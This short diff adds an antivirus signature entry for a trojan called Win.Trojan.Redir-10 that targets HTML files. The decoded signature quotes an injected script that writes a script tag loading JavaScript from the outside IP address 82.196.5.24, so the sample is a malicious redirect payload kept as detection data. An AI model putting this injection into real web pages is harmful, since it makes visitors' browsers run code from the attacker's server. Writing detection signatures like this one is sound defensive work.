@@ -1,0 +1,7 @@
+VIRUS NAME: Win.Trojan.Redir-10
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+[n001.length-n000+1];document.write("<script src="http://82.196.5.24/js.php?"+rnd+""></script>");--></script>
+<script></script>
+<script>_uacct="ua-324340-1";urchintracker();
